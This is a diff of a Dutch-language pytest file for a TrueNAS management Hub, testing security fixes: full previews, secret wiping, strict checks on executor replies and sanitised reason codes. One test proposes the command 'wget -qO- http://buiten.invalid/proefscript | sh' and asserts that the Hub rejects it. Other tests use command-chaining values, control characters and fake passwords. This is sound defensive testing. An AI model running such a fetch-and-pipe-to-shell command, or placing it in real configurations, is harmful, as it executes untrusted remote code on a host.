@@ -380,9 +380,15 @@ def test_vrije_tekst_in_installatiewaarden_ook_weg_na_elke_eindstatus(
     stack: Stack, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
 ) -> None:
     """S-P2-010, bouwpunt 6e (ADR-0030 besluit 28): naast de waarden van omgevingsvariabelen kan ook vrije tekst in
-    ``command``, ``entrypoint``, ``labels`` en ``notes`` een geheim bevatten (bv. een wachtwoord als argument). Na
-    afloop staat die nergens meer in de database van de Hub: na uitgevoerd, afgewezen, verlopen, geweigerd bij de
-    herberekening (``_herbereken``) en onbekend (``_sluit``). Zolang een voorstel open is, staat hij er wel."""
+    ``labels`` en ``notes`` een geheim bevatten. Na afloop staat die nergens meer in de database van de Hub: na
+    uitgevoerd, afgewezen, verlopen, geweigerd bij de herberekening (``_herbereken``) en onbekend (``_sluit``). Zolang
+    een voorstel open is, staat hij er wel.
+
+    Sinds S-P2-040 (R-VEILIG-1; ADR-0030 besluit 32) staan ``labels`` en ``notes`` mét waarde in de preview: ook in de
+    antwoorden, die de idempotentie-opslag hooguit een dag bewaart (de worker ruimt ze op); na afloop wist de Hub ze ook
+    uit de bewaarde preview. ``command`` en ``entrypoint`` weigert de Hub nu al bij het voorstel; een open voorstel van
+    vóór dat herstel met zo'n opdracht wordt bij goedkeuren geweigerd en gewist (integratietest
+    ``test_open_voorstel_met_eigen_opdracht_van_voor_het_herstel_wordt_geweigerd``)."""
     import shutil
 
     from asm_policy import load_policy
@@ -398,15 +404,14 @@ def test_vrije_tekst_in_installatiewaarden_ook_weg_na_elke_eindstatus(
         params = install_params(
             app_id,
             envs=[{"name": "PROEF_WACHTWOORD", "value": f"{w}-env"}],
-            command=["--wachtwoord", f"{w}-cmd"],
-            entrypoint=[f"/start-{w}-ep"],
             notes=f"notitie {w}-notes",
             labels=[{"key": "proef", "value": f"{w}-label", "containers": [app_id]}],
         )
         r = stel_voor(admin, "app.install", app_target(app_id), params)
         assert r.status_code == 201, r.text
-        for veld in ("env", "cmd", "ep", "notes", "label"):
-            assert _tabellen_met(stack.app, f"{w}-{veld}") == ["action_request"], (w, veld)
+        assert _tabellen_met(stack.app, f"{w}-env") == ["action_request"], w
+        for veld in ("notes", "label"):
+            assert _tabellen_met(stack.app, f"{w}-{veld}") == ["action_request", "idempotency_record"], (w, veld)
         return dict(r.json())
 
     # Uitgevoerd: TrueNAS kreeg de waarden; daarna staan ze niet meer in de Hub.
@@ -414,7 +419,7 @@ def test_vrije_tekst_in_installatiewaarden_ook_weg_na_elke_eindstatus(
     assert keur_goed(admin, a).status_code == 200
     r = voer_uit(admin, a)
     assert r.status_code == 200 and r.json()["status"] == "uitgevoerd", r.text
-    assert nas.created[0]["values"]["command"] == ["--wachtwoord", "geheim-uit-6101-cmd"]
+    assert nas.created[0]["values"]["notes"] == "notitie geheim-uit-6101-notes"
     # Afgewezen en verlopen.
     b = voorstel("demo-b", "geheim-af-6102")
     r = admin.post(f"/api/v1/actions/{b['request_id']}/reject", json={"reden": "niet nu"}, headers=idem())
@@ -449,8 +454,23 @@ def test_vrije_tekst_in_installatiewaarden_ook_weg_na_elke_eindstatus(
     r = voer_uit(admin, e)
     assert r.status_code == 502 and r.json()["code"] == "uitkomst_onbekend", r.text
     assert haal(admin, e)["status"] == "onbekend"
-    for w in ("geheim-uit-6101", "geheim-af-6102", "geheim-verl-6103", "geheim-gew-6104", "geheim-onb-6105"):
-        for veld in ("env", "cmd", "ep", "notes", "label"):
+    alle = ("geheim-uit-6101", "geheim-af-6102", "geheim-verl-6103", "geheim-gew-6104", "geheim-onb-6105")
+    for w in alle:
+        assert _tabellen_met(stack.app, f"{w}-env") == [], w
+        for veld in ("notes", "label"):
+            assert _tabellen_met(stack.app, f"{w}-{veld}") == ["idempotency_record"], (w, veld)
+    # De idempotentie-opslag ruimt de worker na een dag op; daarna staat de vrije tekst nergens meer.
+    from sqlalchemy import update
+
+    from hub import worker
+    from hub.models import IdempotencyRecord
+
+    with stack.app.state.sessionmaker() as db:
+        db.execute(update(IdempotencyRecord).values(created_at=IdempotencyRecord.created_at - timedelta(days=2)))
+        worker.cleanup(db)
+        db.commit()
+    for w in alle:
+        for veld in ("env", "notes", "label"):
             assert _tabellen_met(stack.app, f"{w}-{veld}") == [], (w, veld)
     for v in (a, b, c, d, e):
         assert haal(admin, v)["parameters_sha256"] == v["parameters_sha256"]
@@ -459,8 +479,11 @@ def test_vrije_tekst_in_installatiewaarden_ook_weg_na_elke_eindstatus(
         rij = db.get(ActionRequest, uuid.UUID(e["request_id"]))
         values = rij.parameters["app_create"]["values"]
         assert values["envs"] == [{"name": "PROEF_WACHTWOORD", "waarde_gewist": True}]
-        assert sorted(values["vrije_tekst_gewist"]) == ["command", "entrypoint", "labels", "notes"]
-        assert not {"command", "entrypoint", "labels", "notes"} & set(values)
+        assert sorted(values["vrije_tekst_gewist"]) == ["labels", "notes"]
+        assert not {"labels", "notes"} & set(values)
+        getoond = rij.preview["wijziging"]["waarden"]
+        assert getoond["labels"] == getoond["notes"] == {"waarde_gewist": True}, getoond
+        assert getoond["envs"] == ["PROEF_WACHTWOORD"], getoond
     assert schrijfaanroepen(nas) == ["app.create"]
 
 
@@ -1278,6 +1301,8 @@ def test_journaalrij_die_achteraf_afwijking_of_mislukt_is_neemt_ophelderen_over(
         assert r.json()["details"]["reden"] == "job_mislukt [FAILED]", r.text
         assert nu["status"] == "mislukt" and nu["resultaat"]["gestopt"] is False, nu
         assert ev[-1]["uitkomst"] == "mislukt" and ev[-1]["reden"] == "job_mislukt [FAILED]", ev
+        # S-P2-040, R-TECH-2: de executor meldt hier zelf gestopt=false; de Hub geeft precies dat door.
+        assert ev[-1]["gestopt"] is False, ev
     else:
         assert r.status_code == 409 and r.json()["code"] == "afwijking", r.text
         assert r.json()["details"]["reden"] == journaal and r.json()["details"]["gestopt"] is True, r.text
@@ -1415,6 +1440,13 @@ def test_truenas_weigert_de_schrijfactie_mislukt_zonder_afwijking(stack: Stack) 
     assert r.status_code == 502 and r.json()["code"] == "uitvoering_mislukt", r.text
     assert haal(admin, v)["status"] == "mislukt"
     assert "action.execution.failed" in audit_acties(stack.app)
+    # S-P2-040, R-TECH-1: het event van dit pad (502 uitvoering_mislukt) neemt de reden van de executor over; de
+    # executor meldt hier geen stop, dus "gestopt" staat er niet in (de Hub leidt het nooit af).
+    reden = r.json()["details"]["reden"]
+    assert reden == "job_mislukt", r.text
+    ev = [e for e in _events(stack.app, "action.run.failed") if e["request_id"] == v["request_id"]]
+    assert len(ev) == 1 and ev[0]["uitkomst"] == "mislukt", ev
+    assert ev[0]["reden"] == reden and "gestopt" not in ev[0], ev
 
 
 def test_executor_zonder_schrijfsleutel_voert_niets_uit(
@@ -1437,3 +1469,341 @@ def test_executor_zonder_schrijfsleutel_voert_niets_uit(
         assert haal(admin, v)["status"] == "mislukt" and schrijfaanroepen(nas) == []
     finally:
         s.stop()
+
+
+# ---------------------------------------------------------------------- S-P2-040 herstel (R-VEILIG-1, -2 en -3)
+def test_preview_toont_wat_naar_truenas_gaat_en_een_eigen_opdracht_wordt_geweigerd(stack: Stack) -> None:
+    """R-VEILIG-1 (blokkerend): een operator stelde een installatie voor met hostname, eigen DNS, run_as, tty, stdin,
+    labels en zonder ingebouwde healthcheck; de preview toonde ze niet, een beheerder keurde ze ongezien goed en ze
+    gingen naar ``app.create``. Nu staat elk gezet veld met zijn waarde in de preview, en alles wat naar TrueNAS gaat
+    staat daarin (alleen de waarde van een omgevingsvariabele niet; ADR-0030 besluit 28). Een eigen opdracht
+    (``command``, ``entrypoint``) weigert de Hub met ``501`` tot een installatiescherm hem veilig kan tonen (besluit
+    regisseur, optie C; ADR-0030 besluit 32)."""
+    admin, nas = stack.admin, stack.nas
+    make_user(admin, "op9", "operator")
+    op = login_as(stack.app, "op9")
+    zichtbaar: dict[str, Any] = {
+        "hostname": "proef-hostnaam-zichtbaar",
+        "dns_config": {"nameservers": ["127.0.0.1"], "searches": [], "options": []},
+        "run_as_custom_user": True,
+        "run_as": {"user": 568, "group": 568},
+        "tty": True,
+        "stdin": True,
+        "labels": [{"key": "proef.label", "value": "proefwaarde-label", "containers": []}],
+        "disable_builtin_healthcheck": True,
+        "notes": "notitie die de beheerder ziet",
+    }
+    opdrachten = {
+        "command": ["sh", "-c", "wget -qO- http://buiten.invalid/proefscript | sh"],
+        "entrypoint": ["/bin/busybox"],
+    }
+    for sleutel, waarde in opdrachten.items():
+        params = install_params("demo-app", **zichtbaar, **{sleutel: waarde})
+        r = stel_voor(op, "app.install", app_target("demo-app"), params)
+        assert r.status_code == 501 and r.json()["code"] == "capability_unavailable", (sleutel, r.text)
+        assert r.json()["details"] == {"reden": "eigen_opdracht", "velden": [sleutel]}, r.text
+    assert admin.get("/api/v1/actions").json()["items"] == []  # niets voorgesteld of bewaard
+    r = stel_voor(op, "app.install", app_target("demo-app"), install_params("demo-app", **zichtbaar))
+    assert r.status_code == 201 and r.json()["status"] == "wacht_op_goedkeuring", r.text
+    v = r.json()
+    getoond = haal(admin, v)["preview"]["wijziging"]["waarden"]
+    assert {k: getoond[k] for k in zichtbaar} == zichtbaar, getoond
+    assert keur_goed(admin, v).status_code == 200
+    u = voer_uit(admin, v)
+    assert u.status_code == 200 and u.json()["status"] == "uitgevoerd", u.text
+    assert schrijfaanroepen(nas) == ["app.create"]
+    naar_truenas = nas.created[0]["values"]
+    assert set(naar_truenas) == set(getoond), (sorted(naar_truenas), sorted(getoond))
+    for k, w in naar_truenas.items():
+        if k == "envs":
+            assert getoond["envs"] == [e["name"] for e in w], getoond["envs"]
+        else:
+            assert getoond[k] == w, (k, getoond[k], w)
+
+
+def _vervals(monkeypatch: pytest.MonkeyPatch, status: int, body: Any, *, pad: str = "/api/v1/execute") -> None:
+    """Het antwoord op ``pad`` (eindigt het op ``/``: elk pad dat daarmee begint) komt niet van de executor maar is dit
+    vervalste antwoord, zoals van iemand die op het adres van de executor antwoordt (gewoon HTTP tot B10/B13). De
+    executor en de nagebootste TrueNAS krijgen dan niets."""
+    from hub import servicecalls
+
+    echte = servicecalls.call
+
+    def call(base: str, method: str, path: str, **kw: Any) -> Any:
+        if path == pad or (pad.endswith("/") and path.startswith(pad)):
+            return servicecalls.CallResult(status, body, {})
+        return echte(base, method, path, **kw)
+
+    monkeypatch.setattr(servicecalls, "call", call)
+
+
+def _audit_details(app: Any, request_id: str) -> list[tuple[str, dict[str, Any]]]:
+    from sqlalchemy import select
+
+    from hub.models import AuditEvent
+
+    with app.state.sessionmaker() as db:
+        rows = db.scalars(select(AuditEvent).where(AuditEvent.target_id == request_id).order_by(AuditEvent.id))
+        return [(str(a.action), dict(a.details or {})) for a in rows]
+
+
+def _alle_incidenten(admin: Any, soort: str) -> list[dict[str, Any]]:
+    """Ook opgeloste incidenten (de lijst toont standaard alleen de actieve)."""
+    items = admin.get("/api/v1/incidents", params={"status": "alle"}).json()["items"]
+    return [i for i in items if i["soort"] == soort]
+
+
+WEG = object()
+# Wat in het antwoord ontbreekt of niet de juiste vorm heeft (R-VEILIG-2); "volledig" is de tegenproef.
+ONVOLLEDIG: dict[str, dict[str, Any]] = {
+    "volledig": {},
+    "kaal": {"kaal": True},
+    "zonder_methode": {"methode": WEG},
+    "methode_vrije_tekst": {"methode": "app.start; iets anders"},
+    "before_hash_geen_sha256": {"before_hash": "abc"},
+    "zonder_after_hash": {"after_hash": WEG},
+    "zonder_policy_hash": {"policy_hash": WEG},
+    "ander_beleid": {"policy_hash": "sha256:" + "0" * 64},
+    "uitgevoerd_op_ongeldig": {"uitgevoerd_op": "gisteren"},
+    "zonder_uitgevoerd_op": {"uitgevoerd_op": WEG},
+}
+
+
+def _uitgevoerd_antwoord(v: dict[str, Any], wijzig: dict[str, Any]) -> dict[str, Any]:
+    """Een 200-antwoord in de vorm van de echte executor (``uitvoeren.py``, ``_teruglezen``), met ``wijzig`` erover."""
+    if wijzig.get("kaal"):
+        return {"status": "uitgevoerd"}
+    body: dict[str, Any] = {
+        "status": "uitgevoerd",
+        "request_id": v["request_id"],
+        "action_id": v["action_id"],
+        "target": v["target"],
+        "methode": "app.start",
+        "before_hash": "sha256:" + "1" * 64,
+        "after_hash": "sha256:" + "2" * 64,
+        "resource_etag": "sha256:" + "2" * 64,
+        "readback": {"naam": "my-house", "staat": "RUNNING"},
+        "waarschuwingen": [],
+        "policy_hash": v["policy_hash"],
+        "uitgevoerd_op": "2026-11-15T10:00:00Z",
+        **wijzig,
+    }
+    return {k: w for k, w in body.items() if w is not WEG}
+
+
+@pytest.mark.parametrize("geval", list(ONVOLLEDIG))
+def test_uitgevoerd_alleen_met_volledig_bewijs_anders_onbekend(
+    stack: Stack, periodic_run: Any, monkeypatch: pytest.MonkeyPatch, geval: str
+) -> None:
+    """R-VEILIG-2: een kaal antwoord ``200 {"status": "uitgevoerd"}`` telde als succes en sloot het kritieke incident
+    van het doel. Nu legt de Hub "uitgevoerd" alleen vast met ``methode``, ``before_hash``, ``after_hash``,
+    ``uitgevoerd_op`` en ``policy_hash`` (gelijk aan het eigen beleid) in de juiste vorm; anders is de uitkomst
+    onbekend (``502 uitkomst_onbekend``, net als bij een onduidelijk antwoord) en blijft het incident
+    ``actie.afwijking`` open."""
+    admin, nas = stack.admin, stack.nas
+    _vervals(monkeypatch, 409, {"code": "afwijking", "message": "m", "details": {"reden": "staat_verschilt"}})
+    a = stel_voor(admin, "app.restart", app_target("my-house")).json()
+    assert voer_uit(admin, a).status_code == 409
+    periodic_run("incidenten_bijwerken")
+    assert [(i["status"], i["ernst"]) for i in _alle_incidenten(admin, "actie.afwijking")] == [("open", "kritiek")]
+    v = stel_voor(admin, "app.start", app_target("my-house")).json()
+    assert v["status"] == "klaar", v
+    _vervals(monkeypatch, 200, _uitgevoerd_antwoord(v, ONVOLLEDIG[geval]))
+    r = voer_uit(admin, v)
+    periodic_run("incidenten_bijwerken")
+    afwijking = [(i["status"], i["ernst"]) for i in _alle_incidenten(admin, "actie.afwijking")]
+    if geval == "volledig":
+        assert r.status_code == 200 and r.json()["status"] == "uitgevoerd", r.text
+        assert r.json()["resultaat"]["methode"] == "app.start", r.text
+        assert afwijking == [("opgelost", "kritiek")], afwijking
+        return
+    assert r.status_code == 502 and r.json()["code"] == "uitkomst_onbekend", r.text
+    assert r.json()["details"] == {"request_id": v["request_id"], "reden": "executor_bewijs_onvolledig"}, r.text
+    nu = haal(admin, v)
+    assert nu["status"] == "onbekend" and nu["uitgevoerd_op"] is None, nu
+    assert [e for e in _events(stack.app, "action.run.succeeded") if e["request_id"] == v["request_id"]] == []
+    assert afwijking == [("open", "kritiek")], afwijking
+    assert [i["status"] for i in _alle_incidenten(admin, "actie.uitkomst_onbekend")] == ["open"]
+    assert schrijfaanroepen(nas) == []
+
+
+def test_ophelderen_neemt_uitgevoerd_alleen_over_met_volledig_bewijs(
+    stack: Stack, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """R-VEILIG-2, ook via het journaal: een journaalrij "uitgevoerd" zonder ``methode``, ``before_hash``,
+    ``after_hash`` en einde in de juiste vorm (of van een ander verzoek) helpt de onbekende uitkomst niet op. Het echte
+    journaal van de executor heeft het volledige bewijs en dan wel (tegenproef). Er wordt niets herhaald."""
+    admin, nas = stack.admin, stack.nas
+    stand = _antwoord_valt_weg(monkeypatch)
+    v = stel_voor(admin, "app.restart", app_target("my-house")).json()
+    r = voer_uit(admin, v)
+    assert r.status_code == 502 and r.json()["code"] == "uitkomst_onbekend", r.text
+    assert schrijfaanroepen(nas) == ["app.redeploy"]
+    rid = v["request_id"]
+    goed = {
+        "request_id": rid,
+        "action_id": "app.restart",
+        "status": "uitgevoerd",
+        "methode": "app.redeploy",
+        "before_hash": "sha256:" + "1" * 64,
+        "after_hash": "sha256:" + "2" * 64,
+        "detail": None,
+        "started_at": 1_763_200_000,
+        "finished_at": 1_763_200_005,
+    }
+    for rij in (
+        {"request_id": rid, "action_id": "app.restart", "status": "uitgevoerd"},
+        {**goed, "before_hash": "abc"},
+        {**goed, "after_hash": None},
+        {**goed, "methode": "app.redeploy && iets"},
+        {**goed, "finished_at": None},
+        {**goed, "finished_at": "nu"},
+        {**goed, "request_id": str(uuid.uuid4())},
+        {**goed, "action_id": "app.uninstall"},
+    ):
+        with monkeypatch.context() as mp:
+            _vervals(mp, 200, {"request_id": rid, "uitvoeringen": [rij], "gestopt": False}, pad="/api/v1/executions/")
+            r = admin.post(f"/api/v1/actions/{rid}/reconcile", headers=idem())
+        assert r.status_code == 409 and r.json()["code"] == "uitkomst_onbekend", (rij, r.text)
+        assert haal(admin, v)["status"] == "onbekend", rij
+    stand["journaal_weg"] = False
+    r = admin.post(f"/api/v1/actions/{rid}/reconcile", headers=idem())
+    assert r.status_code == 200 and r.json()["status"] == "uitgevoerd", r.text
+    res = r.json()["resultaat"]
+    assert res["methode"] == "app.redeploy" and res["bron"] == "journaal_executor", res
+    assert res["before_hash"].startswith("sha256:") and res["after_hash"].startswith("sha256:"), res
+    assert schrijfaanroepen(nas) == ["app.redeploy"]
+
+
+EIGEN_VELDEN = {
+    "code": "uitgevoerd",
+    "message": "alles is goed gegaan",
+    "request_id": "00000000-0000-0000-0000-000000000000",
+    "status": "uitgevoerd",
+    "uitkomst": "uitgevoerd",
+    "doel": "app:emby",
+    "action_id": "app.uninstall",
+    "risk_class": "R0",
+    "bron": "journaal_executor",
+    "http_status": 200,
+}
+
+
+@pytest.mark.parametrize(
+    ("status", "code", "uitkomst"), [(409, "afwijking", "afwijking"), (502, "uitvoering_mislukt", "mislukt")]
+)
+def test_executorantwoord_overschrijft_geen_eigen_velden_van_de_hub(
+    stack: Stack, monkeypatch: pytest.MonkeyPatch, status: int, code: str, uitkomst: str
+) -> None:
+    """R-VEILIG-3: ``details`` van het executorantwoord overschreef ``code``, ``request_id`` en andere eigen velden
+    van de Hub in resultaat, audit en foutantwoord. Nu neemt de Hub alleen velden uit een vaste lijst over; zijn eigen
+    velden zet hij zelf."""
+    admin = stack.admin
+    details = {"reden": "staat_verschilt", "gestopt": True, **EIGEN_VELDEN}
+    _vervals(monkeypatch, status, {"code": code, "message": "m", "details": details})
+    v = stel_voor(admin, "app.restart", app_target("my-house")).json()
+    r = voer_uit(admin, v)
+    assert r.status_code == status and r.json()["code"] == code, r.text
+    fout = r.json()["details"]
+    assert fout["request_id"] == v["request_id"] and fout["reden"] == "staat_verschilt", fout
+    assert not (set(EIGEN_VELDEN) - {"request_id"}) & set(fout), fout
+    nu = haal(admin, v)
+    assert nu["status"] == uitkomst and nu["resultaat"]["code"] == code, nu["resultaat"]
+    assert nu["resultaat"]["message"] == "m" and nu["resultaat"]["reden"] == "staat_verschilt", nu["resultaat"]
+    assert not (set(EIGEN_VELDEN) - {"code", "message"}) & set(nu["resultaat"]), nu["resultaat"]
+    actie, audit = _audit_details(stack.app, v["request_id"])[-1]
+    assert actie.startswith("action.execution.") and audit["code"] == code and audit["uitkomst"] == uitkomst, audit
+    assert (audit["doel"], audit["action_id"], audit["risk_class"]) == ("app:my-house", "app.restart", "R1"), audit
+    ev = [e for e in _events(stack.app, "action.run.failed") if e["request_id"] == v["request_id"]]
+    assert len(ev) == 1 and ev[0]["uitkomst"] == uitkomst and ev[0]["reden"] == "staat_verschilt", ev
+    assert (ev[0]["doel"], ev[0]["action_id"], ev[0]["risk_class"]) == ("app:my-house", "app.restart", "R1"), ev
+    assert ev[0]["gestopt"] is True, ev
+    assert "app:emby" not in r.text and "app:emby" not in admin.get("/api/v1/actions").text
+
+
+GEHEIM_IN_REDEN = "wachtwoord=Zomer-2026-geheim api_key=1-" + "a" * 64
+
+
+@pytest.mark.parametrize(("status", "code"), [(409, "afwijking"), (502, "uitvoering_mislukt")])
+@pytest.mark.parametrize(
+    ("reden", "verwacht"),
+    [
+        (GEHEIM_IN_REDEN, "onbekende_reden"),
+        ("regel1\nregel2\x00\x1b[31m", "onbekende_reden"),
+        ({"a": 1}, "onbekende_reden"),
+        (["x"], "onbekende_reden"),
+        (5, "onbekende_reden"),
+        ("x" * 5000, "onbekende_reden"),
+        ("", None),
+        (None, None),
+        ("staat_verschilt", "staat_verschilt"),
+        ("job_mislukt [FAILED]", "job_mislukt [FAILED]"),
+    ],
+    ids=[
+        "geheim",
+        "stuurtekens_en_nul",
+        "object",
+        "lijst",
+        "getal",
+        "te_lang",
+        "leeg",
+        "geen",
+        "code",
+        "code_foutnaam",
+    ],
+)
+def test_reden_van_de_executor_is_altijd_een_code(
+    stack: Stack, monkeypatch: pytest.MonkeyPatch, status: int, code: str, reden: Any, verwacht: str | None
+) -> None:
+    """R-VEILIG-3: vrije tekst in ``reden`` stond ongeredigeerd in event, audit en resultaat; een NUL-teken gaf HTTP
+    500 (PostgreSQL 22P05). Nu is ``reden`` overal een code met een vast tekenpatroon (bv. ``staat_verschilt`` of
+    ``job_mislukt [FAILED]``), anders ``onbekende_reden``. ``gestopt`` gaat alleen mee als echte ja/nee."""
+    admin = stack.admin
+    _vervals(monkeypatch, status, {"code": code, "message": "m", "details": {"reden": reden, "gestopt": "ja"}})
+    v = stel_voor(admin, "app.restart", app_target("my-house")).json()
+    r = voer_uit(admin, v)
+    assert r.status_code == status and r.json()["code"] == code, r.text
+    assert r.json()["details"]["reden"] == verwacht and "gestopt" not in r.json()["details"], r.text
+    nu = haal(admin, v)
+    assert nu["resultaat"]["reden"] == verwacht and "gestopt" not in nu["resultaat"], nu["resultaat"]
+    ev = [e for e in _events(stack.app, "action.run.failed") if e["request_id"] == v["request_id"]]
+    assert len(ev) == 1 and ev[0]["reden"] == verwacht and "gestopt" not in ev[0], ev
+    assert _audit_details(stack.app, v["request_id"])[-1][1]["reden"] == verwacht
+    teksten = [r.text, admin.get("/api/v1/actions").text, str(ev), str(_audit_details(stack.app, v["request_id"]))]
+    assert not any("Zomer-2026-geheim" in t for t in teksten)
+
+
+def test_te_groot_of_onleesbaar_executorantwoord(stack: Stack, monkeypatch: pytest.MonkeyPatch) -> None:
+    """R-VEILIG-3: 900 kB in ``details`` van een weigering stond ongekort in het resultaat, dus in elk lijstantwoord.
+    Nu neemt de Hub van een weigering alleen bekende velden over, elk met een vaste vorm en grootte. Een weigering met
+    een code buiten het vaste patroon (hier met een NUL-teken) is geen bruikbaar antwoord: de uitkomst is onbekend,
+    geen HTTP 500."""
+    admin = stack.admin
+    fouten = [{"veld": "a", "code": "b", "fout": "c"}]
+    groot = {"reden": "geweigerd_door_proef", "vulling": "A" * 900_000, "fouten": fouten}
+    _vervals(monkeypatch, 409, {"code": "iets_geweigerd", "message": "m" * 900_000, "details": groot})
+    v = stel_voor(admin, "app.restart", app_target("my-house")).json()
+    r = voer_uit(admin, v)
+    assert r.status_code == 409 and r.json()["code"] == "uitvoering_geweigerd", r.text[:300]
+    assert r.json()["details"]["executor"] == {
+        "code": "iets_geweigerd",
+        "message": None,
+        "details": {"reden": "geweigerd_door_proef", "fouten": fouten},
+    }, r.text[:300]
+    nu = haal(admin, v)
+    assert nu["status"] == "mislukt" and "vulling" not in nu["resultaat"]["details"], str(nu)[:300]
+    # Een afwijking met een reusachtige lijst afwijkingen: die lijst valt weg, de rest blijft.
+    afw = {"reden": "staat_verschilt", "gestopt": True, "afwijkingen": [{"code": "x", "gevonden": "A" * 900_000}]}
+    _vervals(monkeypatch, 409, {"code": "afwijking", "message": "m", "details": afw})
+    w = stel_voor(admin, "app.restart", app_target("mediaguard")).json()
+    r = voer_uit(admin, w)
+    assert r.status_code == 409 and r.json()["code"] == "afwijking", r.text[:300]
+    assert haal(admin, w)["resultaat"]["afwijkingen"] is None
+    assert len(admin.get("/api/v1/actions").text) < 100_000
+    # Een code met een NUL-teken: onbekend, geen 500.
+    _vervals(monkeypatch, 409, {"code": "geweigerd\x00", "message": "m", "details": {}})
+    x = stel_voor(admin, "app.start", app_target("my-house")).json()
+    r = voer_uit(admin, x)
+    assert r.status_code == 502 and r.json()["code"] == "uitkomst_onbekend", r.text
+    assert r.json()["details"]["reden"] == "executor_http_409", r.text
+    assert haal(admin, x)["status"] == "onbekend"
